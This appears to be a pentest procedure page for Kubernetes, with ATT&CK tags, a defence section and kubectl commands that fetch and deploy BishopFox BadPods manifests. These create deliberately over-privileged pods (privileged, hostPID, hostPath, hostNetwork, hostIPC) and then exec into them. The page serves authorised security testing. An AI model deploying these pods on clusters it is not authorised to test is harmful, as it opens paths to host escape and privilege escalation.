---
id: 3d5f60fc-8ef3-4df7-8302-d3e760b92e44
name: Deploy-BadPods-for-Kubernetes-Security-Testing
type: procedure
verified: true
submitted: false
created_at: '2023-10-01T00:00:00+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - >-
    [[techniques/Command-and-Scripting-Interpreter|T1059 - Command and Scripting
    Interpreter]]
sub_techniques:
  - '[[sub-techniques/Unix-Shell|T1059.004 - Unix Shell]]'
tags:
  - Kubernetes
  - Pentest
  - Containers
  - BadPods
commands:
  - '[[commands/kubectl-apply-everything-allowed-exec-pod]]'
  - '[[commands/kubectl-apply-priv-and-hostpid-exec-pod]]'
  - '[[commands/kubectl-apply-priv-exec-pod]]'
  - '[[commands/kubectl-apply-hostpath-exec-pod]]'
  - '[[commands/kubectl-apply-hostpid-exec-pod]]'
  - '[[commands/kubectl-apply-hostnetwork-exec-pod]]'
  - '[[commands/kubectl-apply-hostipc-exec-pod]]'
  - '[[commands/kubectl-apply-nothing-allowed-exec-pod]]'
platforms:
  - Kubernetes
tools:
  - '[[tools/kubectl]]'
  - '[[tools/BadPods]]'
validated: true
---

# Deploy-BadPods-for-Kubernetes-Security-Testing

## Summary

This procedure deploys a set of intentionally vulnerable Kubernetes pods from the BishopFox BadPods collection to test the security posture of a Kubernetes cluster. By applying these manifests, pentesters can simulate various privilege escalation and misconfiguration exploits, identifying weaknesses in pod security policies, RBAC, and network controls without risking production workloads.

## Description

BadPods provides a series of YAML manifests that create pods with escalating levels of risky configurations, such as privileged execution, host namespace sharing, and volume mounts. This procedure assumes the tester has legitimate access to the cluster (e.g., via a service account or admin credentials) and uses kubectl to apply the manifests directly from the GitHub repository. The deployment helps uncover issues like overly permissive security contexts, hostPath volume exposures, or inadequate network policies. Once deployed, testers can interact with the pods to validate detections and remediations, such as PodSecurityStandards enforcement or admission controllers. This is particularly useful in red team exercises or compliance audits for containerized environments.

## Requirements

1. kubectl installed and configured with access to the target Kubernetes cluster (e.g., via kubeconfig file).
2. Authentication credentials with at least 'create' permissions on pods in the target namespace (admin privileges recommended for full testing).
3. Network access to the GitHub repository (https://raw.githubusercontent.com/BishopFox/badPods).
4. Basic knowledge of Kubernetes concepts like pods, namespaces, and security contexts.

## Defense

- Enforce strict Pod Security Standards (PSS) or use tools like OPA Gatekeeper to block privileged pods and host namespace access.
- Implement Role-Based Access Control (RBAC) to limit pod creation to verified users and monitor API server logs for suspicious apply operations.
- Regularly scan for and audit deployed pods using tools like kube-bench or Trivy, and enable audit logging for kubectl commands.
- Use network policies to restrict pod-to-host communication and avoid hostPath mounts in production.

## Objectives

1. Deploy vulnerable pods to simulate real-world misconfigurations and privilege escalations.
2. Identify gaps in cluster security controls, such as missing admission webhooks or weak RBAC.
3. Validate detection mechanisms by observing how the cluster responds to these deployments.
4. Assess overall container security posture and recommend remediations.

## Instructions

### Step 1: Verify Cluster Access and Namespace

**Context**: Ensure kubectl is connected to the target cluster and select or create a test namespace to avoid impacting production.

Run `kubectl get nodes` to confirm connectivity.

**Command** ([[commands/kubectl-get-nodes]]):
```bash
kubectl get nodes
```

> This lists available nodes, confirming access. If errors occur, update your kubeconfig.

Expected Output:
```
NAME       STATUS   ROLES                  AGE   VERSION
node1      Ready    control-plane,master   1d    v1.25.0
node2      Ready    <none>                 1d    v1.25.0
```

Create a test namespace if needed:
```bash
kubectl create namespace badpods-test
kubectl config set-context --current --namespace=badpods-test
```

**Success Indicators**:
- Nodes listed without authentication errors.
- Namespace created and context updated.

### Step 2: Deploy Everything Allowed Exec Pod

**Context**: Apply the manifest for a pod with maximum privileges (hostPID, hostIPC, hostNetwork, privileged, etc.) to test if the cluster blocks over-privileged containers.

**Command** ([[commands/kubectl-apply-everything-allowed-exec-pod]]):
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/everything-allowed/pod/everything-allowed-exec-pod.yaml
```

> This deploys a pod that attempts to use all risky features. Monitor for admission denials.

Expected Output:
```
pod/everything-allowed-exec-pod created
```

**Success Indicators**:
- Pod created successfully (indicating potential security gap).
- Use `kubectl get pods` to verify deployment.

### Step 3: Deploy Priv and HostPID Exec Pod

**Context**: Test combined privileged mode and host PID namespace sharing, which could allow process enumeration on the host.

**Command** ([[commands/kubectl-apply-priv-and-hostpid-exec-pod]]):
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv-and-hostpid/pod/priv-and-hostpid-exec-pod.yaml
```

> Deploys a pod simulating escalation via shared PID namespace in privileged context.

Expected Output:
```
pod/priv-and-hostpid-exec-pod created
```

**Success Indicators**:
- Pod status shows 'Running' via `kubectl get pods`.
- No immediate eviction by security policies.

### Step 4: Deploy Priv Exec Pod

**Context**: Isolate privileged execution testing to check if the cluster allows containers to run as root with full capabilities.

**Command** ([[commands/kubectl-apply-priv-exec-pod]]):
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/priv/pod/priv-exec-pod.yaml
```

> Focuses on securityContext.privileged: true.

Expected Output:
```
pod/priv-exec-pod created
```

**Success Indicators**:
- Pod launches without capability drops.

### Step 5: Deploy HostPath Exec Pod

**Context**: Test hostPath volume mounts that could expose host filesystems to the container.

**Command** ([[commands/kubectl-apply-hostpath-exec-pod]]):
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpath/pod/hostpath-exec-pod.yaml
```

> Mounts sensitive host paths like /etc.

Expected Output:
```
pod/hostpath-exec-pod created
```

**Success Indicators**:
- Pod can access mounted host directories (test with exec).

### Step 6: Deploy HostPID Exec Pod

**Context**: Share the host's PID namespace to potentially enumerate or kill host processes.

**Command** ([[commands/kubectl-apply-hostpid-exec-pod]]):
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostpid/pod/hostpid-exec-pod.yaml
```

Expected Output:
```
pod/hostpid-exec-pod created
```

**Success Indicators**:
- Pod sees host processes via `ps aux` inside.

### Step 7: Deploy HostNetwork Exec Pod

**Context**: Use host networking to bypass pod network isolation and access host ports.

**Command** ([[commands/kubectl-apply-hostnetwork-exec-pod]]):
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostnetwork/pod/hostnetwork-exec-pod.yaml
```

Expected Output:
```
pod/hostnetwork-exec-pod created
```

**Success Indicators**:
- Pod binds to host interfaces.

### Step 8: Deploy HostIPC Exec Pod

**Context**: Share host IPC namespace for inter-process communication exploits.

**Command** ([[commands/kubectl-apply-hostipc-exec-pod]]):
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/hostipc/pod/hostipc-exec-pod.yaml
```

Expected Output:
```
pod/hostipc-exec-pod created
```

**Success Indicators**:
- Shared memory segments visible.

### Step 9: Deploy Nothing Allowed Exec Pod

**Context**: Deploy a baseline non-privileged pod to compare against risky ones and test default policies.

**Command** ([[commands/kubectl-apply-nothing-allowed-exec-pod]]):
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
```

Expected Output:
```
pod/nothing-allowed-exec-pod created
```

**Success Indicators**:
- Pod runs in restricted mode as expected.

### Step 10: Verify and Interact with Deployed Pods

**Context**: Check pod statuses and exec into them to test exploits (e.g., `kubectl exec -it pod-name -- /bin/sh` to simulate attacks).

Run `kubectl get pods -o wide` to list all.

Expected Output:
```
NAME                           READY   STATUS    RESTARTS   AGE   IP           NODE
everything-allowed-exec-pod    1/1     Running   0          5m    10.244.1.5   node1
...
```

**Success Indicators**:
- All pods in 'Running' state.
- Ability to exec and run commands inside without restrictions (for privileged pods).
